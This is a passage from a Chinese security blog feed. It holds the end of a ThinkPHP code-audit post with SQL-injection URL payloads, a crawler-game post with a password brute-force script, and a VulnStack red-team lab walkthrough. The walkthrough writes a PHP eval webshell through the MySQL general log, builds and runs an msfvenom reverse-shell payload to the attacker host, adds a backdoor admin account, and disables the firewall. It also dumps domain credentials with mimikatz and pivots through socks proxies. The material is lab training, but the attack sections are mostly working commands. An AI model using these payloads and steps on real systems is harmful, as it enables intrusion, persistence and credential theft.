class="string">')-&gt;where($map)-&gt;select();</span></span><br><span class="line"><span class="string">dump(data);</span></span><br><span class="line"><span class="string">SELECT * FROM `thinkphp_user` WHERE `id` = 5 AND ( `username` = '</span>afanti<span class="string">' AND `score` = '</span><span class="number">10</span><span class="string">' )</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">15、模板问题</span></span><br><span class="line"><span class="string">$name = $_GET['</span>name<span class="string">'];</span></span><br><span class="line"><span class="string">$this-&gt;assign($name); </span></span><br><span class="line"><span class="string">$this-&gt;display('</span>index<span class="string">'); //'</span>TMPL_ENGINE_TYPE<span class="string">' =&gt; '</span>php<span class="string">'才有效，默认是Think</span></span><br><span class="line"><span class="string">[url]http://127.0.0.1/tp/index.php/home/user/index?name[/url][_content]=</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">16、在runtime/key.php</span></span><br><span class="line"><span class="string">S('</span>a<span class="string">',I('</span>id<span class="string">')); //http://127.0.0.1/tp/index.php/home/index/test?id=%0Aphpinfo%28%29//</span></span><br><span class="line"><span class="string">在Temp生成文件 生成的文件名字可到cmd5破解</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">F('</span>key<span class="string">','</span><span class="string">'); </span></span><br><span class="line"><span class="string">$this-&gt;display();</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">17.select、find、delete注入</span></span><br><span class="line"><span class="string">public function test()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">       $id = i('</span>id<span class="string">');</span></span><br><span class="line"><span class="string">       $res = M('</span>user<span class="string">')-&gt;find($id);</span></span><br><span class="line"><span class="string">       //$res = M('</span>user<span class="string">')-&gt;delete($id);</span></span><br><span class="line"><span class="string">       //$res = M('</span>user<span class="string">')-&gt;select($id);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">注入的payload:</span></span><br><span class="line"><span class="string">table：[url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"><span class="string">alias：[url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"><span class="string">where: [url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"><span class="string">delete方法注入payload:</span></span><br><span class="line"><span class="string">where: [url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"><span class="string">alias: [url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"><span class="string">table: [url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1</span></span><br></pre></td></tr></table></figure>

<p>陆陆续续整理了两周，也算是整完了，都是一些简单的漏洞。主要是学习一些代码审计的思路和方法，工具的配置和审计流程。也了解了thinkphp框架的基本结构，后面准备复现一些相关的cve。</p>
<p>参考链接：<a href="https://www.mrwu.red/web/2043.html" target="_blank" rel="noopener">https://www.mrwu.red/web/2043.html</a><br><a href="https://www.bilibili.com/video/BV1K4411X7aS?from=search&seid=5833038953068986991>" target="_blank" rel="noopener">视频连接</a><br><a href="https://www.bugbank.cn/api/tweet/59f4562b7933885a45820544/inner?token=0835e822abb00678cca5c467b80fda75" target="_blank" rel="noopener">Thinkphp 从漏洞挖掘到安全防御pdf</a></p>
]]></content>
      <tags>
        <tag>PHP代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫闯关游戏</title>
    <url>/2020/03/30/pachongchuangguan/</url>
    <content><![CDATA[<p>上周在无意中发现了这个python爬虫闯关游戏，刚好最近发现自己编程基础太菜了，于是便准备做一下来提高自己的编程基础。=&gt;<a href="http://www.heibanke.com/lesson/crawler_ex00" target="_blank" rel="noopener">游戏地址</a>&lt;=<a id="more"></a></p>
<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><p><img src="/2020/03/30/pachongchuangguan/1.png" alt></p>
<p>这里要将浏览器上显示的数字写在url后面，我的想法是通过requests模块和re模块来实现。先通过正则表达式获取网页上的数字，然后加在url后面便可以了，说着挺简单的，动手写就不一定了。<br>实现代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用需要的模块</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#获取网页数据</span></span><br><span class="line">url=<span class="string">"http://www.heibanke.com/lesson/crawler_ex00/64899"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">    res=requests.get(url)</span><br><span class="line">    print(url)</span><br><span class="line">    print(res)</span><br><span class="line">    pat=<span class="string">"&lt;h3&gt;下一个你需要输入的数字是(\d*.?)"</span>      <span class="comment">#匹配数字</span></span><br><span class="line">    result=re.compile(pat).findall(res.text)     <span class="comment">#全局匹配</span></span><br><span class="line">    print(result)</span><br><span class="line">    response=<span class="string">''</span>.join(result)		<span class="comment">#将列表转换为字符串</span></span><br><span class="line">    print(response)</span><br><span class="line">    result2=response.replace(<span class="string">'.'</span>,<span class="string">''</span>)	<span class="comment">#匹配到的字符串后面的.替换掉</span></span><br><span class="line">    print(result2)</span><br><span class="line">    <span class="keyword">if</span> result2==[]:</span><br><span class="line">        print(<span class="string">"The end"</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url=<span class="string">"http://www.heibanke.com/lesson/crawler_ex00/"</span>+result2</span><br></pre></td></tr></table></figure>

<p>上面的代码是自己写的，有很多问题，主要是正则表达式不怎么会写，因为第一页数字后面没有<code>.</code>后面有<code>.</code>所以就从第二页开始匹配。这里调试了很久，足以显示出我的水平够菜了。</p>
<p><img src="/2020/03/30/pachongchuangguan/2.png" alt></p>
<p>下面是百度找的代码，比我的简便很多。里面使用了bs4模块，准备下午学习一下这个模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="comment">#获取网页数据</span></span><br><span class="line">url=<span class="string">"http://www.heibanke.com/lesson/crawler_ex00/"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res=requests.get(url)</span><br><span class="line">    <span class="comment">#print(url)</span></span><br><span class="line">    soup=bs4.BeautifulSoup(res.text,<span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="comment">#print(res)</span></span><br><span class="line">    comic=soup.select(<span class="string">'h3'</span>)</span><br><span class="line">    print(comic[<span class="number">0</span>].getText())</span><br><span class="line">    number =re.findall(<span class="string">"\d+"</span>,comic[<span class="number">0</span>].getText())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number==[]:</span><br><span class="line">        print(<span class="string">"The end"</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url=<span class="string">"http://www.heibanke.com/lesson/crawler_ex00/"</span>+number[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/pachongchuangguan/3.png" alt>没有对比就没有伤害。。</p>
<p><img src="/2020/03/30/pachongchuangguan/4.png" alt></p>
<h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p><img src="/2020/03/30/pachongchuangguan/5.png" alt><br>第二关为一个登陆框，密码为30以内的数字，我们可以模拟一个post登陆一个一个尝试密码就可以了<br>实现代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://www.heibanke.com/lesson/crawler_ex01/"</span></span><br><span class="line">data1=&#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">"admin"</span>,</span><br><span class="line">        <span class="string">"password"</span>:<span class="string">"0"</span></span><br><span class="line">    &#125;</span><br><span class="line">normallen=len(requests.post(url=url,data=data1).text)</span><br><span class="line">print(normallen)                <span class="comment">#输出错误时页面的长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">"admin"</span>,</span><br><span class="line">        <span class="string">"password"</span>:i,</span><br><span class="line">    &#125;</span><br><span class="line">    res=requests.post(url=url,data=data)</span><br><span class="line">    finalllen=len(res.text)</span><br><span class="line">    print(finalllen)                    <span class="comment">#当输入密码时的长度</span></span><br><span class="line">    <span class="keyword">if</span>(finalllen!=normallen):                   <span class="comment">#判断密码正确时长度和密码错误时的长度是否相等，如果不相等则密码正确</span></span><br><span class="line">        print(<span class="string">"密码正确,密码为"</span>+str(i)+<span class="string">""</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>第二关挺简单的，跟一般的sql注入脚本差不多，所以实现起来没什么难度。我们可以通过判断返回的页面长度是否相等来判断密码是否正确。<br><img src="/2020/03/30/pachongchuangguan/6.png" alt>)<img src="/2020/03/30/pachongchuangguan/7.png" alt></p>
<h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1>]]></content>
      <tags>
        <tag>python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>[域渗透]Vulnstack(一)</title>
    <url>/2020/06/15/Vulnstack%E4%B8%80/</url>
    <content><![CDATA[<p><strong>[ATT&amp;CK实战]VulnStack红队（一)</strong></p>
<a id="more"></a>

<h1 id="内网和域"><a href="#内网和域" class="headerlink" title="内网和域"></a>内网和域</h1><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p>
<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p>
<p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p>
<p>域控制器可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p>
<p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p>
<ul>
<li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　</li>
<li>– 域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 </li>
<li>– 域：域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li>
</ul>
<blockquote>
<p>域和域之间可以通过VPN等设备进行连接，并建立从属和平行的域关系</p>
</blockquote>
<h1 id="域渗透的思路"><a href="#域渗透的思路" class="headerlink" title="域渗透的思路"></a>域渗透的思路</h1><pre><code>通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。</code></pre><h1 id="—靶机实战—"><a href="#—靶机实战—" class="headerlink" title="—靶机实战—"></a>—靶机实战—</h1><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶机地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>加上kali攻击机一共四台机器。。。。<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592038305775.png" alt="1592038305775"></p>
<p>kali设置成NAT模式，win7网络适配器1设置成自定义（VMnet1仅主机模式），网络适配器2设置成NAT模式，win2003、win2008 网络适配器设置成自定义（VMnet1仅主机模式）。主机默认开机密码都是hongrisec@2019，手动在win7的c盘下开启phpstudy。</p>
<p>设置完毕后VM1、VM2、VM3就在同一内网中了，只有VM1web服务器能够访问内网，所以要想访问win2008和win2003服务器必须要先拿下win7服务器，用它做跳板进内网进行横向渗透。</p>
<blockquote>
<p>攻击机：kali ip:192.168.211.151 / 物理机 ip:192.168.211.1</p>
<p>win7 内网ip:192.168.52.143 外网ip:192.168.211.158</p>
<p>win2003 ip:192.168.52.141</p>
<p>win2008 ip:192.168.52.138</p>
</blockquote>
<p>拓扑图<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592013381503.png" alt="1592013381503"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>先使用nmap进行主机发现</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592011728471.png" alt="1592011728471"></p>
<p>目标靶机ip为</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.211</span><span class="number">.158</span></span><br></pre></td></tr></table></figure>

<p>之后再对其进行端口扫描</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.158</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592011946262.png" alt="1592011946262"></p>
<p>靶机开放了80端口和3306端口<br>访问80端口，发现是一个phpstudy探针页面<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592012107913.png" alt="1592012107913"></p>
<p>进行目录扫描<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592012372900.png" alt="1592012372900"></p>
<p>得到phpinfo.php和phpmyadmin页面<br>可以通过phpinfo.php页面获得网站的绝对路径<br>访问phpmyadmin，发现使用弱口令root/root能直接登录成功<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592012875133.png" alt="1592012875133"></p>
<p>在数据库中发现了一个newyxcms数据库，猜测应该还有一个yxcms的网站<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592013081708.png" alt="1592013081708"></p>
<p>这里也可以猜到目录为/yxcms<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592013222492.png" alt="1592013222492"></p>
<h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>通过信息收集得到了两种getshell的可行方式，一种是通过phpmyadmin进行getshell，另一种是通过yxcmsgetshell</p>
<h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>网站的绝对路径可以通过phpinfo.php获得，尝试通过写入一句话木马进行getshell<br>先执行<code>show global variables like &#39;%secure%&#39;;</code>查看是否能够写入<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592013641907.png" alt="1592013641907"></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">secure_file_priv为<span class="literal">null</span> 表示不允许导入导出；</span><br><span class="line"></span><br><span class="line">secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹；</span><br><span class="line"></span><br><span class="line">secure_file_priv没有设置时，则表示没有任何限制；</span><br></pre></td></tr></table></figure>

<p>该方法行不通，尝试换一种方法</p>
<p>找到一篇文章，可以通过<strong><a href="https://zhuanlan.zhihu.com/p/55466863" target="_blank" rel="noopener">日志文件写入一句话来获取webshell</a></strong><br>我们执行的每一个sql语句都会被保存到日志中，换个思路想一下把这个日志文件重名为<em>.php,然后我们在执行一次sql语句，那么就会被保存在这个</em>.php文件中，这样我们就能顺利拿到webshell。</p>
<p>手动修改：</p>
<p>点击变量选项，搜索gen就会出来general.log和general log file这两个变量，general.log变量是指是否启动记录日志；而general log file指的是日志文件的路径，可以看到general.log变量的状态为OFF，故我们要修改为ON；general log file变量中的<em>.log的后缀我们改为</em>php。</p>
<p>SQL语句进行修改：</p>
<p>set global general_log = “ON”; 日记保存状态开启；<br>SET global general_log_file=’c:/phpStudy/phpstudy/PHPTutorial/WWW/shell.php’<br>修改日记的保存位。（具体路径还需在实际环境中改变）；</p>
<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592014482309.png" alt="1592014482309"></p>
<p>之后执行</p>
<blockquote>
<p>select “&lt;?php eval($_POST[a]);?&gt;“;</p>
</blockquote>
<p>访问1.php,使用蚁剑连接即可得到shell<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592032772934.png" alt="1592032772934"></p>
<h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><p>可以很容易找到网站后台?r=admin自动跳转到index.php?r=admin/index/login<br>爆破一下得到用户名密码为admin/123456<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592033196752.png" alt="1592033196752"></p>
<p>这里可以直接在前台模板出修改index.php文件，直接插入一句话获得shell<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592033325609.png" alt="1592033325609"></p>
<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592036667259.png" alt="1592036667259"></p>
<h1 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h1><blockquote>
<p>ipconfig /all</p>
</blockquote>
<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592036447678.png" alt="1592036447678"></p>
<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592036500877.png" alt="1592036500877"></p>
<p>192.168.52.143为win7内网ip地址<br>win2003和win2008内网ip如下</p>
<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592118829061.png" alt="1592118829061"></p>
<h2 id="尝试远程登录"><a href="#尝试远程登录" class="headerlink" title="尝试远程登录"></a>尝试远程登录</h2><p> 查看当前用户权限，因为一般拿下window的话都会尝试去连接它的远程桌面，所以再查看一下3389端口开放情况<br><code>netstat -an | find &quot;3389&quot;</code><br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592036641280.png" alt="1592036641280"></p>
<p>没有回显即没有开启3389端口<br>可以使用以下命令开启它（win7、win2003、winxp），运行后显示3389端口已经成功开启（关闭命令把如下0都换成1）：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server <span class="string">/v</span> fDenyTSConnections <span class="string">/t</span> REG_DWORD <span class="string">/d</span> 00000000 <span class="string">/f</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592036735107.png" alt="1592036735107"></p>
<p> 添加用户</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">net user test <span class="number">123</span>!@asd /add <span class="comment"># 添加账户密码</span></span><br><span class="line">net localgroup administrators test /add <span class="comment"># 给test账户添加为管理员权限</span></span><br><span class="line">net user test <span class="comment"># 查询是否成功添加test用户</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592036974167.png" alt="1592036974167"></p>
<p>使用finalshell远程桌面连接，但是连接失败<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592037062114.png" alt="1592037062114"></p>
<p>使用nmap查看3389端口，发现其状态为filtered，查看防火墙只能本地连接<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592037145400.png" alt="1592037145400"></p>
<h2 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h2><p>首先生成shell.exe</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span> LPORT=<span class="number">4444</span> -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<p>使用msf监听</p>
<blockquote>
<p>use exploit/multi/handler</p>
<p>set payload windows/meterpreter/reverse_tcp</p>
<p>set Lhost 192.168.211.151</p>
<p>run</p>
</blockquote>
<p>将生成的文件通过蚁剑上传到win7，使用<code>start shell.exe</code>来执行<br>成功获得会话<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592103556453.png" alt="1592103556453"></p>
<p>然后关闭防火墙</p>
<blockquote>
<p>第一种是刚刚msf反弹回来的输入<br>run post/windows/manage/enable_rdp<br>第二种是在菜刀命令终端下输入<br>netsh advfirewall set allprofiles state off</p>
</blockquote>
<p>可成功远程连接，但是另一台机器会被挤下线</p>
<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592119662314.png" alt="1592119662314"></p>
<h2 id="使用隧道连接3389"><a href="#使用隧道连接3389" class="headerlink" title="使用隧道连接3389"></a>使用隧道连接3389</h2><p>除了使用msf反弹，还可以使用隧道连接3389</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">在Sunny-Ngrok的官网 <span class="symbol">https:</span>/<span class="regexp">/www.ngrok.cc/</span> 注册一个账号（可以通过这个软件实现使用外链访问电脑本地项目的功能），登录之后选择隧道管理-&gt;开通隧道-&gt;选择一个服务器（frp或者ngrok）-&gt;开通隧道并获得一个隧道id-&gt;下载客户端-&gt;打开客户端启动工具-&gt;输入隧道id-&gt;本地远程登录。</span><br><span class="line"></span><br><span class="line">开通隧道时隧道名称随意写，本地端口写想要转发出去的计算机ip及端口（可以为局域网内任意机器映射，这里填入想要转发的win7的ip及端口）</span><br></pre></td></tr></table></figure>

<h2 id="getsystem提到系统权限"><a href="#getsystem提到系统权限" class="headerlink" title="getsystem提到系统权限"></a>getsystem提到系统权限</h2><p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592106884378.png" alt="1592106884378"></p>
<h2 id="mimikatz获取账号密码"><a href="#mimikatz获取账号密码" class="headerlink" title="mimikatz获取账号密码"></a>mimikatz获取账号密码</h2><p>加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程，而且该进程需要是system权限运行<br>ps查看进程id，选择一个system权限的进程，一般选择explorer.exe对应的PID<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592107368867.png" alt="1592107368867"></p>
<p>这里选择488</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">migrate</span> <span class="string">488</span></span><br><span class="line"><span class="attr">load</span> <span class="string">mimikatz</span></span><br><span class="line"><span class="attr">mimikatz_command</span> <span class="string">-f sekurlsa::searchPasswords</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592107570290.png" alt="1592107570290"></p>
<p>成功获得账号密码</p>
<blockquote>
<p>{ Administrator ; GOD.ORG ; hongrisec@2020 }</p>
</blockquote>
<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>常用命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">net time /domain        <span class="comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span></span><br><span class="line">net user /domain        <span class="comment">#查看域用户</span></span><br><span class="line">net view /domain        <span class="comment">#查看有几个域</span></span><br><span class="line">ipconfig /all 　　　　　  <span class="comment">#查询本机IP段，所在域等 </span></span><br><span class="line">net config Workstation  <span class="comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span></span><br><span class="line">net user 　　　　　　　   <span class="comment">#本机用户列表</span></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain   <span class="comment">#查看域内所有的主机名 </span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain      <span class="comment">#查看域管理员 </span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain <span class="comment">#查看域控</span></span><br><span class="line">net localhroup administrators          <span class="comment">#本机管理员[通常含有域用户]</span></span><br><span class="line">net user 用户名 /domain                 <span class="comment">#获取指定用户的账户信息  </span></span><br><span class="line">net group /domain                      <span class="comment">#查询域里面的工作组 </span></span><br><span class="line">net group 组名 /domain                  <span class="comment">#查询域中的某工作组</span></span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">net<span class="built_in"> group </span><span class="string">"domain admins"</span> /domain	#查看域管理员</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592117069699.png" alt="1592117069699"></p>
<figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line">ipconfig /<span class="built_in">all</span>		<span class="meta">#查询本机IP段，所在域等</span></span><br></pre></td></tr></table></figure>

<p>存在内网和域，192.168.211.138为域控机器<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592117554528.png" alt="1592117554528"></p>
<p>查询域列表<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592118365174.png" alt="1592118365174"></p>
<p>查看同域机器<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592118265793.png" alt="1592118265793"></p>
<p>查看域用户<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592118342690.png" alt="1592118342690"></p>
<p>查询当前计算机名、计算机全名、用户名、工作站、软件版本、工作站域、工作站域 DNS 名称、登录域</p>
<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592118582340.png" alt="1592118582340"></p>
<p>信息整理</p>
<blockquote>
<p>域：god.org</p>
<p>域内有三个用户：Administrator、ligang、liukaifeng01</p>
<p>域内三台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA</p>
<p>域控：OWA(192.168.52.138)</p>
<p>win7内网ip：192.168.52.143</p>
</blockquote>
<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="添加路由-挂Socks4a代理"><a href="#添加路由-挂Socks4a代理" class="headerlink" title="添加路由/挂Socks4a代理"></a>添加路由/挂Socks4a代理</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">添加路由的目的是为了让MSF其他模块能访问内网的其他主机，即<span class="number">52</span>网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递</span><br><span class="line"></span><br><span class="line">添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</span><br><span class="line"></span><br><span class="line">（添加路由一定要在挂代理之前，因为代理需要用到路由功能）</span><br></pre></td></tr></table></figure>

<blockquote>
<p>run  get_local_subnets    查看当前网段<br>run autoroute -s 192.168.52.0/24<br>run autoroute -p</p>
</blockquote>
<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592121409360.png" alt="1592121409360"></p>
<p>arp -a查看所有接口的当前 ARP 缓存表<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592123028840.png" alt="1592123028840"></p>
<p>设置代理，设置成功后打开其他程序需前加上proxychains<br><strong>这里必须将会话放到后台，不能从新开一个msf，不然代理不成功！！！！</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Ctrl+z  把会话放到后台</span><br><span class="line">Ctrl+c  结束会话</span><br><span class="line">msf exploit(handler) &gt; sessions -i <span class="number">2</span>   选择会话</span><br><span class="line">msf exploit(handler) &gt; sessions -k <span class="number">2</span>   结束会话</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">use</span> auxiliary/<span class="keyword">server</span>/socks4a   <span class="comment">#添加socks4a代理</span></span><br><span class="line"><span class="keyword">set</span> srvport <span class="number">1080</span><span class="comment">#设置端口</span></span><br><span class="line"><span class="keyword">set</span> srvhost <span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>之后修改/etc/proxychains.conf，将9050改为1080<br><img src="/2020/06/15/Vulnstack%E4%B8%80/1592127769741.png" alt="1592127769741"></p>
<p>之后便能通过内网ip访问</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">proxychains curl <span class="string">http:</span><span class="comment">//192.168.52.143</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592139026667.png" alt="1592139026667"></p>
<h2 id="攻击内网主机"><a href="#攻击内网主机" class="headerlink" title="攻击内网主机"></a>攻击内网主机</h2><p>内网存活主机服务探测</p>
